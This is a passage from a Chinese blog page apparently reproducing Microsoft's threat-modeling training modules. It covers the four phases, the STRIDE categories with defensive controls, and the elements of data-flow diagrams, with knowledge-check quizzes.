info"><p>大多数数据流关系图应同时包含第 0 层和第 1 层。 与安全团队交流，确认所需的层次深度。</p></div><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>Threat Modeling Tool<ul><li>在线安装版，<a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</a></li><li>离线安装版，<a href="https://www.microsoft.com/en-us/download/details.aspx?id=49168">https://www.microsoft.com/en-us/download/details.aspx?id=49168</a> （2016）</li><li>想装其他离线版本的，Guguru 一下 <u>microsoft threat modeling tool offline installer</u> 就好了</li></ul></li><li>Visio，（要钱的 打扰了</li></ul><h4 id="知识检查"><a href="#知识检查" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>设计阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 你知道系统的工作方式。 还可以确定从云提供商和集成服务继承的安全要求、保证或差距</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 此时不必研究所有安全保证、假设和差距，唯一的任务就是创建数据流关系图</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 在创建数据流关系图之前，确定并解决与系统相关的所有安全问题</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 在创建数据流关系图之前，请尽可能收集有关系统的上下文。B. 在设计阶段较早收集尽可能多的上下文，你就可以做出明智的决策以更好地保护系统。C. 在设计阶段之后的中断和修复阶段执行创建关系图的任务。</psw></p><h3 id="步骤2-中断"><a href="#步骤2-中断" class="headerlink" title="步骤2 - 中断"></a>步骤2 - 中断</h3><p>在中断阶段，<strong>需使用数据流关系图查找针对系统的潜在威胁</strong>。 此过程使用威胁建模框架，以帮助你查找最常见的威胁和防范威胁的方法。</p><h4 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h4><ul><li>选择以 “保护系统” 或 “了解攻击者” 为核心的方法 （可参考模块4了解这两种方法）</li><li>使用 <a href="https://zh.wikipedia.org/wiki/STRIDE">STRIDE</a> 框架识别常见威胁（STRIDE威胁模型几乎可以涵盖目前绝大部分安全问题），即<ul><li>欺骗（<strong>S</strong>poofing）</li><li>篡改（<strong>T</strong>ampering）</li><li>否认（<strong>R</strong>epudiation）</li><li>资讯泄露（<strong>I</strong>nformation disclosure），可能是隐私泄露或是资料外泄</li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">阻断服务攻击</a>（<strong>D</strong>enial of service）</li><li><a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87">特权提升</a>（<strong>E</strong>levation of privilege</li></ul></li></ul><div class="note warning"><p>如果不完成此阶段，就不会发现系统中的潜在威胁，这可能会导致未来出现违规现象。</p></div><h4 id="确定方法侧重点"><a href="#确定方法侧重点" class="headerlink" title="确定方法侧重点"></a>确定方法侧重点</h4><p>首先，选择是要找到保护系统的方法，还是想要尽可能地了解攻击者及其动机。 示例包括：</p><table><thead><tr><th align="left">侧重点</th><th align="left">可以查找的内容示例</th></tr></thead><tbody><tr><td align="left">系统</td><td align="left">发现用户与系统之间的未加密连接存在问题。</td></tr><tr><td align="left">攻击者</td><td align="left">进一步了解方法、动机和强化系统入口点的方法。</td></tr><tr><td align="left">资产</td><td align="left">基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。</td></tr></tbody></table><div class="note info"><p>Microsoft 产品工程师主要致力于保护系统。 渗透测试团队两者兼顾。</p></div><h4 id="选择威胁框架"><a href="#选择威胁框架" class="headerlink" title="选择威胁框架"></a>选择威胁框架</h4><p>接下来，选择一个框架，帮助生成系统中的潜在威胁。 Microsoft 通常使用 <a href="https://zh.wikipedia.org/wiki/STRID">STRIDE</a>（六个主要威胁类别的首字母缩写）提供广泛但不完整的威胁列表。</p><p>此框架可帮助你提出有关系统的几个重要问题：</p><table><thead><tr><th align="left">威胁</th><th align="left">定义</th><th align="left">问题</th><th align="left">威胁示例</th></tr></thead><tbody><tr><td align="left">欺骗</td><td align="left">攻击者冒充某人或某物</td><td align="left">通信的双方是否都通过了身份验证？</td><td align="left">通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限。</td></tr><tr><td align="left">篡改</td><td align="left">攻击者在未经授权的情况下更改数据</td><td align="left">如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？</td><td align="left">通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息。</td></tr><tr><td align="left">否认性</td><td align="left">攻击者声称尚未执行任何操作</td><td align="left">每个操作是否可以绑定到标识？</td><td align="left">声称没有删除数据库记录。</td></tr><tr><td align="left">信息泄露</td><td align="left">攻击者看到了不应看到的数据</td><td align="left">如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？</td><td align="left">访问安全控制较弱的未授权文档和文件夹。</td></tr><tr><td align="left">拒绝服务</td><td align="left">攻击者使你的系统崩溃</td><td align="left">系统中是否存在资源受限的区域？</td><td align="left">向网络发送大量请求。</td></tr><tr><td align="left">权限提升</td><td align="left">攻击者未经授权而可访问数据</td><td align="left">如何得知某人可以执行此操作？</td><td align="left">利用输入处理逻辑或内存中的弱点来提取数据。</td></tr></tbody></table><h4 id="知识检查-1"><a href="#知识检查-1" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>中断阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 通过相关框架选择重点领域，以系统地识别系统中的潜在威胁。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 通过相关框架选择重点领域，以系统地识别可以应用到系统的解决方案。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 安全团队开会讨论，选择重点领域和相关框架，以系统地识别系统中的潜在威胁。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 在使用 STRIDE 查找潜在威胁时，请关注系统或攻击者。B. 此任务属于阶段 3 - 修复阶段。C. 在大多数情况下，可以选择与安全团队开会讨论，但不强制要求这么做（除非组织有相关要求）。</psw></p><h3 id="步骤3-修复"><a href="#步骤3-修复" class="headerlink" title="步骤3 - 修复"></a>步骤3 - 修复</h3><p>在修复阶段，需要决定如何处理所有威胁。 每个 STRIDE 威胁都对应到一项或多项安全控制，这些控制措施提供不同的功能和类型供你选择。</p><h4 id="目标-2"><a href="#目标-2" class="headerlink" title="目标"></a>目标</h4><ul><li>根据<strong>优先级框架或安全 bug 栏衡量每个威胁的优先级</strong></li><li>在 bug 管理服务中将每个威胁作为任务或工作项进行跟踪</li><li>生成对应于 STRIDE 威胁的安全控制建议</li><li>选择一项或多项安全控制类型和功能来应对每个威胁</li><li>解决任务</li></ul><div class="note warning"><p>如果不完成此阶段，就找不到安全控制来帮助降低风险或正确跟踪每个威胁。</p></div><h4 id="设置威胁跟增工作流"><a href="#设置威胁跟增工作流" class="headerlink" title="设置威胁跟增工作流"></a>设置威胁跟增工作流</h4><h5 id="确定威胁的优先级"><a href="#确定威胁的优先级" class="headerlink" title="确定威胁的优先级"></a>确定威胁的优先级</h5><p>首先，根据优先级框架或安全 bug 栏来衡量每个威胁。 此过程可帮助你计划资源来解决对组织而言更重要的问题。</p><p>此过程使用三个关键变量：</p><table><thead><tr><th align="left">变量</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><strong>影响</strong></td><td align="left">使用 STRIDE 类别分配影响。</td></tr><tr><td align="left"><strong>严重性</strong></td><td align="left">使用内部 bug 栏或优先级框架来分配最坏情况下的严重性。</td></tr><tr><td align="left"><strong>风险</strong></td><td align="left">对安全控制有效性和实现成本进行计算。</td></tr></tbody></table><div class="note info"><p>Microsoft 工程师使用内部安全 bug 栏，为威胁分配“严重”、“重要”、“中等”、“低”或“信息”严重性等级。 请咨询安全团队，确认如何确定问题的优先级。</p></div><h5 id="创建任务"><a href="#创建任务" class="headerlink" title="创建任务"></a>创建任务</h5><p>接下来，在 Azure DevOps Services 等 <strong>bug 管理解决方案</strong>中添加每个威胁。 部分优点包括：</p><ul><li>进一步确定问题责任人</li><li>有效跟踪历史记录</li><li>让你能够使用标准化模板来进行优先级和解决方案演练</li></ul><h4 id="评估威胁有效性和成本"><a href="#评估威胁有效性和成本" class="headerlink" title="评估威胁有效性和成本"></a>评估威胁有效性和成本</h4><p>查看对应于 STRIDE 威胁的每项安全控制建议。 记下最有效和成本最低的建议。 以下是一些示例：</p><table><thead><tr><th align="left">威胁</th><th align="left">安全控制</th><th align="left">安全控制示例</th></tr></thead><tbody><tr><td align="left"><strong>欺骗</strong></td><td align="left">身份验证</td><td align="left">发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性。</td></tr><tr><td align="left"><strong>篡改</strong></td><td align="left">完整性</td><td align="left">验证输入以防止处理恶意有效负载和错误处理意外行为。</td></tr><tr><td align="left"><strong>否认性</strong></td><td align="left">不可否认性</td><td align="left">创建和保护包含用户操作和时间戳的安全日志。</td></tr><tr><td align="left"><strong>信息泄露</strong></td><td align="left">保密性</td><td align="left">应用访问控制列表，以确保合适的用户可以访问适当的数据。</td></tr><tr><td align="left"><strong>拒绝服务</strong></td><td align="left">可用性</td><td align="left">使用弹性资源管理不断增加或减少的使用量。</td></tr><tr><td align="left"><strong>权限提升</strong></td><td align="left">授权</td><td align="left">使用最少的访问量运行服务。</td></tr></tbody></table><div class="note info"><p>可能有这样的安全控制，可以同时减轻或完全消除多个威胁。 例如，使用 SSL/TLS 创建安全传输通道，以帮助防止恶意数据修改或泄露。</p></div><h4 id="安全控制措施类型和功能"><a href="#安全控制措施类型和功能" class="headerlink" title="安全控制措施类型和功能"></a>安全控制措施类型和功能</h4><p>安全控制具有不同的类型和功能。 结合使用时，它们有助于保护系统的安全，并创建多个安全保护层，也称为深层防御。</p><p>你可以选择一种或多种安全控制类型：</p><ul><li>物理类型，如摄像头</li><li>技术类型，如加密</li><li>管理类型，如策略</li></ul><p>它们可能有一项或多项安全控制功能：</p><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>预防</strong></td><td align="left">降低威胁的概率或影响，如防火墙。</td></tr><tr><td align="left"><strong>检测</strong></td><td align="left">识别发生的攻击，如监视。</td></tr><tr><td align="left"><strong>纠正</strong></td><td align="left">控制系统如何响应其受到的攻击，如系统修补程序。</td></tr><tr><td align="left"><strong>恢复</strong></td><td align="left">从攻击中恢复系统，如备份。</td></tr><tr><td align="left"><strong>阻碍</strong></td><td align="left">阻止攻击者访问系统，如最低权限。</td></tr></tbody></table><h4 id="为每个问题添加安全控制详细信息"><a href="#为每个问题添加安全控制详细信息" class="headerlink" title="为每个问题添加安全控制详细信息"></a>为每个问题添加安全控制详细信息</h4><p>在 bug 管理解决方案中为每个问题添加详细信息，然后使用以下其中一个解决方案解决各个问题。 这在不同组织之间存在略微差异：</p><table><thead><tr><th align="left">解决方案</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>减轻</strong></td><td align="left">将通过 Bug 修复或重新设计来解决问题，以减轻或消除威胁影响和严重性。</td></tr><tr><td align="left"><strong>转移</strong></td><td align="left">由其他系统或团队处理问题。</td></tr><tr><td align="left"><strong>避免</strong></td><td align="left">去除系统中包含问题的部分。</td></tr><tr><td align="left"><strong>接受</strong></td><td align="left">没有解决方案，将接受风险。 需要经授权的风险决策者的批准，其中决策者可能取决于威胁的严重性。 严重威胁可能需要高级领导的批准，而深层防御风险可能需要高级工程师批准。 与你的团队交流以获得战略指导。</td></tr></tbody></table><h4 id="知识检查-2"><a href="#知识检查-2" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>修复阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 在部署系统之前验证所有修补程序。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 在这一阶段，你将生成并验证一系列安全控制，并设置其优先级，以减轻或消除风险。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 此时，选择框架以帮助生成潜在的威胁。</p>            </div><p>参考答案：<psw>== B ==</psw></p><p>解释：<psw>A. 属于步骤 4 - 验证阶段。B. psw 每个威胁都对应到一个可降低或消除风险的安全控制。 根据组织的安全风险惯例，确定这些威胁的优先级并进行跟踪。C. 此任务属于步骤 2 - 中断阶段。</psw></p><h3 id="步骤4-验证"><a href="#步骤4-验证" class="headerlink" title="步骤4 - 验证"></a>步骤4 - 验证</h3><p>验证阶段是威胁建模过程的最后一步，通常发生在部署系统之前。 它涉及到确保满足要求、验证假设以及准备好安全控制。</p><h4 id="目标-3"><a href="#目标-3" class="headerlink" title="目标"></a>目标</h4><ul><li>确认系统满足所有新旧安全要求</li><li>配置云提供商、操作系统和组件以满足安全要求</li><li>确保使用正确的安全控制解决所有问题</li><li>在部署前对系统进行手动和自动验证</li></ul><div class="note warning"><p>如果不完成此阶段，就无法验证是否已成功完成安全工作。</p></div><h4 id="验证要求和设置默认值"><a href="#验证要求和设置默认值" class="headerlink" title="验证要求和设置默认值"></a>验证要求和设置默认值</h4><p>首先，验证是否满足第一阶段创建的所有要求。</p><p>示例：</p><ul><li>网络安全计划</li><li>机密管理解决方案实施</li><li>日志记录和监视系统</li><li>标识和访问控制</li></ul><p>然后，确保云提供商、操作系统和组件的默认配置设置已更改，可满足所有安全要求。</p><p>示例：</p><ul><li>启用 Azure SQL 数据库透明数据加密以保护磁盘上的数据</li><li>使用基于角色的访问控制 (RBAC) 向用户、组和应用程序分配权限</li><li>跨所有配置文件启用 Windows 防火墙</li></ul><p>应解决 bug 管理解决方案中记录的所有问题并验证所有修补程序。</p><h4 id="执行验证"><a href="#执行验证" class="headerlink" title="执行验证"></a>执行验证</h4><p>最后一部分涉及运行手动和自动验证。 在 Microsoft，部署系统之前必须对其进行验证，验证过程可能包含自动扫描程序、代码评审和渗透测试。 可以在每次部署之前或隔一定的时间（如每 6 - 12 个月）强制执行该过程。</p><p>如果以下任一问题的答案为“是”，最好设置较短的验证周期：</p><ul><li>我的系统会在部使用吗？</li><li>它可以处理机密数据吗？</li><li>我必须遵守某些规定吗？</li><li>我的组织是否要求实施其他安全保护过程，以应对隐私影响、运营风险或开发要求？</li></ul><h4 id="知识检查-3"><a href="#知识检查-3" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>验证阶段要进行哪些工作？</li></ol><div class='checkbox'><input type="radio" />            <p>A. 实施一系列适用的安全控制，以减轻或消除风险。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 在将代码推送到暂存分支进行部署之前，需要对其进行手动检查。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 针对先前产生的威胁手动或自动验证系统，以验证安全控制是否降低或消除了风险。</p>            </div><p>参考答案：<psw>== C ==</psw></p><p>解释：<psw>A. 此任务属于步骤 3 - 修复阶段。B. 此答案更适用于操作方面，而不是威胁建模过程。C. 此阶段的主要工作是验证修复、假设和满足要求。</psw></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><h4 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h4><p>威胁建模是帮助保护系统、应用程序、网络和服务的有效方法。 它可以识别潜在的威胁并推荐风险降低策略，以帮助你在开发生命周期的早期实现安全目标。</p><p>本模块涵盖了以下内容：</p><ul><li>了解明确要求和假设以帮助创建数据流关系图的重要性</li><li>了解可帮助你查找系统中安全问题的框架</li><li>了解有助于减轻或消除潜在威胁的安全控制类别</li><li>重点介绍在部署之前验证假设、要求和修复的重要性</li></ul><h4 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h4><p>在此学习路径的后续几个模块中，我们将了解在四个阶段引入的每个概念，并进行详细讨论：</p><table><thead><tr><th align="left">模块</th><th align="left">标题</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">使用数据流关系图元素创建威胁模型</td><td align="left">了解数据流关系图中的每个元素，包括何时使用它们以及要包含的上下文。</td></tr><tr><td align="left">3</td><td align="left">提供具有适当深度层的上下文</td><td align="left">在创建数据流关系图之前，了解每个上下文层次的差异和适用情形。</td></tr><tr><td align="left">4</td><td align="left">处理数据流关系图时关注适当的威胁模型</td><td align="left">了解关注威胁建模活动的不同方法。</td></tr><tr><td align="left">5</td><td align="left">使用框架识别威胁并找到减少或消除风险的方法</td><td align="left">深入研究 STRIDE，并进一步了解存在的风险以及如何针对这些风险保护系统。</td></tr><tr><td align="left">6</td><td align="left">设置问题的优先级并应用安全控制措施</td><td align="left">了解如何设置威胁优先级，并了解系统安全控制的不同类型和功能。</td></tr><tr><td align="left">7</td><td align="left">使用推荐工具创建数据流图</td><td align="left">了解可用于威胁建模的工具。</td></tr></tbody></table><h4 id="了解详细信息"><a href="#了解详细信息" class="headerlink" title="了解详细信息"></a>了解详细信息</h4><div class="tag link"><a class="link-card" title="安全开发生命周期" href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling"><div class="left"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="lazyload" data-srcset="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="/></div><div class="right"><p class="text">安全开发生命周期</p><p class="url">https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling</p></div></a></div><h2 id="模块2-使用数据流关系图元素创建威胁模型"><a href="#模块2-使用数据流关系图元素创建威胁模型" class="headerlink" title="模块2 | 使用数据流关系图元素创建威胁模型"></a>模块2 | 使用数据流关系图元素创建威胁模型</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>数据流关系图由呈现为形状和线条的元素构成。 数据流关系图以图形方式表示系统的各个主要部分。</p><p>示例包括：</p><ul><li>用于存储客户数据的 Azure DB</li><li>处理用户请求的 Web 服务</li><li>与系统交互的用户</li><li>跨信任区域级别更改的数据流</li></ul><p>在威胁建模中使用元素及其交互，以帮助确定威胁并降低系统风险。 此过程可帮助工程师更有效地进行协作，同时保护其系统免受最常见的威胁攻击。</p><p><strong><u>本模块将介绍数据流关系图的每个元素。 这些元素具有不同的形状和功能，并且需要特定的上下文。</u></strong></p><div class="note info"><p>在整个学习路径中，元素也可以称为“模具”。</p></div><h4 id="何时使用元素"><a href="#何时使用元素" class="headerlink" title="何时使用元素"></a>何时使用元素</h4><p>在创建数据流关系图时使用这些元素。 关系图可显示系统创建、操纵、存储以及删除数据的方式。 我们以第一个模块中的示例为基础进行构建：</p><ul><li><strong>Azure 微服务</strong> - 添加元素以指定用户、身份验证过程、数据存储、数据请求和响应处理过程。<ul><li>别忘了指定信任区域级别更改。</li></ul></li><li><strong>公共 API</strong> - 添加元素以指定用户、数据存储、日志记录和监视流程以及系统的其他部分。</li><li><strong>现有应用程序上的新功能</strong> - 添加元素以表示系统的现有部分和新的部分。</li></ul><h4 id="学习目标-1"><a href="#学习目标-1" class="headerlink" title="学习目标"></a>学习目标</h4><p>在本模块中，你将能够：</p><ul><li>区分每个元素的形状和功能</li><li>在创建数据流关系图时，包含元素的正确上下文</li></ul><div class="note success"><p>无必备知识即可学习 （</p></div><h3 id="数据流关系图元素"><a href="#数据流关系图元素" class="headerlink" title="数据流关系图元素"></a>数据流关系图元素</h3><p>数据流关系图由各种形状组成，这些形状用于创建系统的图形表示形式。 每个形状都表示一个独特的功能。 系统将分析每个交互以帮助识别潜在的威胁和找到降低风险的方法。</p><p>通过正确使用形状，你能更好地明白同事和安全团队提供的信息。 每个人都能了解该系统的工作方式。 这还可以使他们无需查阅无数的设计文档和开发计划即可启动系统并使其正常运行。</p><div class="note info"><p>如果无法在数据流关系图中正确地体现系统的所有部分，则有可能部署具有潜在漏洞的系统。</p></div><table><thead><tr><th align="left">元素</th><th align="left">形状</th><th align="left">定义</th><th>示例</th></tr></thead><tbody><tr><td align="left">过程</td><td align="left"><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></td><td align="left">接收、修改输入或将输入重定向到输出的任务，如 Web 服务。</td><td>Web 服务</td></tr><tr><td align="left">数据存储</td><td align="left"><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></td><td align="left">永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。</td><td>Web 缓存和 Azure DB</td></tr><tr><td align="left">外部实体</td><td align="left"><img src="/img/thread-modeling/external-entity50.png" class="lazyload" data-srcset="/img/thread-modeling/external-entity50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="external-entity50"></td><td align="left">直接控制之外的任务、实体或数据存储，如用户和第三方 API。</td><td>用户和第三方 API</td></tr><tr><td align="left">数据流</td><td align="left"><img src="/img/thread-modeling/data-flow50.png" class="lazyload" data-srcset="/img/thread-modeling/data-flow50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-flow50"></td><td align="left">进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。</td><td>连接字符串和有效负载</td></tr><tr><td align="left">信任边界</td><td align="left"><img src="/img/thread-modeling/trust-boundary-box50.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-box50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-box50"><img src="/img/thread-modeling/trust-boundary-line50-7523817.png" class="lazyload" data-srcset="/img/thread-modeling/trust-boundary-line50-7523817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="trust-boundary-line50"></td><td align="left">信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。</td><td>用户通过 Internet 连接到安全的公司网络</td></tr></tbody></table><p>我们将在接下来的几个单元中讨论每个元素。</p><h3 id="过程-任务元素"><a href="#过程-任务元素" class="headerlink" title="过程 - 任务元素"></a>过程 - 任务元素</h3><p><img src="/img/thread-modeling/process50.png" class="lazyload" data-srcset="/img/thread-modeling/process50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="process50"></p><p>此元素用一个圆圈表示，表示<u><strong>可以修改接收的输入或将接收的输入重定向到其相应输出的活动</strong></u>。</p><p>示例包括：</p><ul><li>接收 API 调用请求并将其转发到 API 处理服务的微服务</li><li>在数据写入数据存储之前验证数据输入的代码</li></ul><h4 id="何时使用过程元素"><a href="#何时使用过程元素" class="headerlink" title="何时使用过程元素"></a>何时使用过程元素</h4><p>在以下项之间添加过程元素：</p><ul><li><strong>数据存储</strong> - 处理数据存储之间的所有通信的过程</li><li><strong>具有其他元素的外部实体</strong> - 处理所有任务和通信的过程</li><li><strong>过程</strong> - 处理所有任务的过程</li></ul><p>根据数据流关系图所需的信息深度级别，可以使用过程元素来表示几个不同的用例：</p><table><thead><tr><th align="left">用例</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">存根</td><td align="left">在较高级别的数据流关系图中将过程元素用作“存根”，这是一种有助于保持整洁的好方法。 它涉及为特定过程创建一个单独的数据流关系图，并将其映射回更高级别的关系图。 它的工作方式类似于“放大”功能，在“放大”过程时，可以使用深层数据流关系图。</td></tr><tr><td align="left">多个任务</td><td align="left">当过程处理多个任务时，此用例适用。 此上下文非常重要，因为它允许查看数据流程图的任何人为每个任务应用适当的安全控制。</td></tr></tbody></table><h4 id="包括上下文"><a href="#包括上下文" class="headerlink" title="包括上下文"></a>包括上下文</h4><p>在每个过程元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">代码</td><td align="left">此过程是否以 C#、C++、Objective C、Java 或脚本语言运行？</td></tr><tr><td align="left">权限级别</td><td align="left">此过程是否需要内核、本地或管理级别权限才能运行？</td></tr><tr><td align="left">服务隔离</td><td align="left">该过程是否在沙盒中运行？</td></tr><tr><td align="left">输入</td><td align="left">此过程可以接受所有人、本地帐户还是仅限管理员的输入？</td></tr><tr><td align="left">验证</td><td align="left">此过程如何分析、处理和接受输入？</td></tr><tr><td align="left">身份验证</td><td align="left">此过程是否依赖于 Azure Active Directory 进行身份验证？ 如果不是，此过程依赖于什么进行身份验证？</td></tr><tr><td align="left">授权</td><td align="left">它是否依赖于访问控制列表 (ACL) 进行授权？ 如果不是，此过程依赖于什么进行授权？</td></tr></tbody></table><h4 id="知识检查-4"><a href="#知识检查-4" class="headerlink" title="知识检查"></a>知识检查</h4><ol><li>以下哪一项操作最能描述过程？</li></ol><div class='checkbox'><input type="radio" />            <p>A. Web 门户要求用户提供其凭据。</p>            </div><div class='checkbox'><input type="radio" />            <p>B. 缓存为用户存储与服务相关的 Cookie。</p>            </div><div class='checkbox'><input type="radio" />            <p>C. 第三方 API 向其请求者发送请求的数据。</p>            </div><p>参考答案：<psw>== A ==</psw></p><p>解释：<psw>A. 门户将处理用户输入，并将其发送到过程的下一部分。B. 存储数据的行为是与数据存储相关的事件。C. 传输数据的行为是与数据流相关的事件。</psw></p><h3 id="数据存储-存储元素"><a href="#数据存储-存储元素" class="headerlink" title="数据存储 - 存储元素"></a>数据存储 - 存储元素</h3><p><img src="/img/thread-modeling/data-store50.png" class="lazyload" data-srcset="/img/thread-modeling/data-store50.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="data-store50"></p><p>此元素用平行线表示，表示<u><strong>临时或永久存储的数据</strong></u>。</p><p>示例包括：</p><ul><li>使用浏览器缓存来存储与用户会话相关的数据</li><li>向数据库添加安全日志事件</li></ul><h4 id="何时使用数据存储元素"><a href="#何时使用数据存储元素" class="headerlink" title="何时使用数据存储元素"></a>何时使用数据存储元素</h4><ul><li>在每次将数据存储在 Azure DB 或本地缓存等位置时</li><li>如果要在两个数据存储之间建立通信，请不要忘记在它们之间添加进程</li><li>数据存储和外部实体都可启动数据流，因此请验证这两者中的任意一个是否已就绪</li><li>确保将数据后期处理包含在内，例如 Azure Analytics 等分析服务。 此过程经常被忽略。</li></ul><h4 id="包含上下文"><a href="#包含上下文" class="headerlink" title="包含上下文"></a>包含上下文</h4><p>在每个数据存储元素中包含以下上下文：</p><table><thead><tr><th align="left">上下文</th><th align="left">问题</th></tr></thead><tbody><tr><td align="left">类型</td><td align="left">系统是否使用 Azure SQL、Cookie、本地或其他某种类型的存储？ 如果是，系统使用的是哪种存储？</td></tr><tr><td align="left">功能</td><td align="left">如何使用存储？ 它是否用于共享数据、存储备份、安全日志、凭据和机密？</td></tr><tr><td align="left">权限级别</td><td align="left">如何实现访问控制？ 拥有读写权限的人员有哪些？</td></tr><tr><td align="left">其他控制</td><td align="left">数据是否加密？ 磁盘是否加密？ 